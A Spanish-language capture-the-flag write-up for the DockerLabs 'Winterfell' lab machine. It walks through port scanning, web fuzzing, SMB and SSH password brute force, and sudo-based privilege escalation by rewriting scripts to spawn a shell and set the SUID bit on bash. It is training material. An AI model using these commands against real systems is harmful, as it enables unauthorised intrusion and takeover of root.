# Winterfell

# Enumeración

Empezamos con un escaneo de los puertos.

`sudo nmap -p- --open -sC -sS -sV --min-rate=5000 -n -Pn -vvv 172.17.0.2 -oN Winterfell`  

- `-p-` : Todos los puertos
- `--open` : Todos los puertos abiertos
- `-sC` : Escaneo de todos los scripts
- `-sS` : Escaneo de todos los servicios
- `-sV` : Escaneo de todas las versiones de los servicios
- `--min-rate 5000` : Establece mínimo envío de paquetes mínimos 5000/s
- `-n` : No aplica resolución DNS
- `-Pn` : Omisión de detección de hosts
- `-vvv` : Verbose - Muestra toda la información

# Resultado escaneo  

Tenemos 4 puertos abiertos.  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_1.jpg)     

Vamos a echar un vistazo a lo que corre en el puerto 80.  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_2.jpg)  

Bueno, a primera vista no hay nada de interesante, a parte un posible nombre de usuario, **jon**.  
Probamos a hacer un poco de fuzzing web a la busqueda de directorios ocultos.  
Para ellos utilizaremos la herramienta **wfuzz**.  

`sudo wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://172.17.0.2/FUZZ`  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_3.jpg)   

Bien, descubrimos un directorio que se llama "dragon".  
Vamos a ver que hay en esta página.  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_4.jpg)    

Si abrimos el fichero nombrado "EpisodiosT1" vemos un listado.  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_5.jpg)   

Podemos intentar a copiar este listado en un fichero que llamaremos pass.txt y utilizarlo como nuestro diccionario para ataque de fuerza bruta.  
Antes pero, debemos intentar enumerar los usuarios.  
Para ello usaremos la herramienta **enum4linux**.  
Ejecutamos el comando `sudo enum4linux -a 172.17.0.2` y vemos que nos saca 3 usuarios.  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_6.jpg)   

Ahora podemos intentar utilizar el diccionario que nos hemos creado anteriormente e intentar un ataque de fuerza bruta contra smb.  
Utilizaremos la herramienta **crackmapexec** y ejecutaremos el comando:  

`sudo crackmapexec smb 172.17.0.2 -u 'jon' -p pass.txt`  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_7.jpg)     

Perfecto, tenemos una contraseña valida.   
Ahora intentaremos enumerar los recursos a los que podemos acceder.   

`sudo smbmap -H 172.17.0.2 -u jon -p seacercaelinvierno`  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_8.jpg)   

Ahora nos conectamos al recurso shared para ver si hay algo interesante.   

`sudo smbclient //172.17.0.2/shared -U jon`  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_9.jpg)    

Nos descargamos el fichero con el comando `get`.  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_10.jpg)      

Si abrimos el ficheros vemos que hay una valiosa información.  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_11.jpg)    

Intentamos decriptarla con este comando.  

`echo 'aGlqb2RlbGFuaXN0ZXI=' | base64 -d`  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_12.jpg)    

Ahora que tenemos una contraseña podemos crearnos un diccionario con los 3 nombres de usuarios (que llamaremos **user.txt**) que hemos descubierto anteriormente y realizar un ataque de fuerza bruta.  
Hecho esto usamoas la herramienta hydra con el comando:  

`sudo hydra -L users.txt -P pass.txt ssh://172.17.0.2 `  

y listo, obtenemos una combinación valida.  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_13.jpg)     

Una vez que nos logeamos con el usuario jon le damos al comando `sudo -l` para intentar escalar privilegios.  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_14.jpg)     

Lo que podemos hacer es borrar el fichero **.mensaje.py** y volver a crearlo insertando este código:  

```
import os    
os.system("/bin/bash")
```

Hecho esto si le damos al comando:  

`sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py`  

ya podemos convertirnos en el usuario **aria**.  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_15.jpg)      

Miramos con `sudo -l` si podemos aprovechar de algun binario para escarlnos a root.  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_16.jpg)        

Miramos a ver si en la home del usuario daenerys hay algo que nos puede servir.  
Para ello damos el comando:  

`sudo -u daenerys /usr/bin/ls /home/daenerys/`  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_17.jpg)      

Bien, ahora lo leemos con el comando:  

`sudo -u daenerys /usr/bin/cat /home/daenerys/mensajeParaJon`  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_18.jpg)     

Perfecto!  
Ahora tenemos la contraseña del usuario daenerys.  
Entramos y le damos otra vez al comando `sudo -l`  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_19.jpg)    

Vemos que no tenemos permisos para editar el fichero con nano y tampoco podemos eliminarlo. 
Lo que intentaremos hacer es crear uno script oneliner e inviarselo con echo.  
Digitaremos el siguente comando:  

`echo -e '#!/bin/bash \n chmod u+s /bin/bash' > .shell.sh`  

Si abrimos el fichero vemos que se ha enviado todo correctamente.  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_20.jpg)    

Ahora ejecutaremos el comando:  

`sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh`  

Y si le damos a `bash -p`...listo!
Ya somos root!  

![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_21.jpg)    











